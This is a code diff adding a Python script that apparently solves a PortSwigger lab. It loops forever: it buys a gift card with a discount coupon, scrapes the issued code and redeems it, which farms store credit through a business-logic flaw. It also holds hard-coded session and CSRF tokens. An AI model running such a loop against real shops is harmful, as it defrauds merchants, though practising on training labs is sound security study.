@@ -1,0 +1,55 @@
+import requests
+import warnings
+from bs4 import BeautifulSoup
+warnings.filterwarnings('ignore')
+import threading
+
+url = 'https://url port swig'
+csrf1 = {'csrf':'pKXTOWetBVRLoD73JfRaiutm9sTxiViL'}
+headers = {"Cookie": "session=3ZUOx5rr3CxytTRdrbeJIfGjbNBb7U0U", 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0'}
+
+proxies = {
+   'http': 'http://127.0.0.1:8082',
+   'https': 'http://127.0.0.1:8082',
+}
+
+cart_data = {'productId':'2','redir':'PRODUCT','quantity':'1'}
+
+app_coupon = {'csrf':'pKXTOWetBVRLoD73JfRaiutm9sTxiViL','coupon':'SIGNUP30'}
+
+
+
+def buygiftcard():
+	req = requests.post(url+'/cart', headers=headers, data=cart_data, verify=False)
+	print(req)
+
+def coupon():
+	req = requests.post(url+'/cart/coupon', headers=headers, data=app_coupon,verify=False)
+	print(req)
+
+
+def checkout():
+	req = requests.post(url+'/cart/checkout', headers=headers, data=csrf1, verify=False, allow_redirects=False)
+	print(req.text)
+
+
+def redeemgiftcard():
+	req = requests.get(url+'/cart/order-confirmation?order-confirmed=true', headers=headers, verify=False, allow_redirects=False)
+	code = BeautifulSoup(req.text, 'html.parser')
+	allcode = code.find('table', class_='is-table-numbers')
+	deta = allcode.find('td')
+	print(deta.text)
+	gc = {'csrf':'pKXTOWetBVRLoD73JfRaiutm9sTxiViL','gift-card':deta.text}
+	req = requests.post(url+'/gift-card', headers=headers, data=gc, verify=False)
+	#print(req.text)
+
+def main():
+	while True:
+		buygiftcard()
+		coupon()
+		checkout()
+		redeemgiftcard()
+
+if __name__ =="__main__":
+    main()
+
